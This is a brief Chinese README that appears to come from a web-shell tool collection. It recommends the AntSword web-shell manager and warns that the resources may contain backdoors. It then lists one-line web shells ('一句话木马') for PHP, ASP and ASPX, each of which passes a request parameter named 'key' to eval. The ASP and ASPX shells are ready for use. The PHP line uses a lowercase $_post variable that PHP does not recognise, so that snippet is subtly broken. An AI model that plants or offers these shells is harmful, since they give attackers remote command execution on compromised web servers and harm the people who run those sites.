# 说明

不保证无后门，资源来源于百度。推荐使用AntSword！！！

https://github.com/TTL-Team/TTL-Tools/tree/main/Web/Shell/AntSword

php一句话木马：<?php @eval($_post['key']);?>

asp一句话木马：<%eval request['key']%>

aspx一句话木马：<%@ page language="jscript"%><%eval(request.item["key"],"unsafe");%>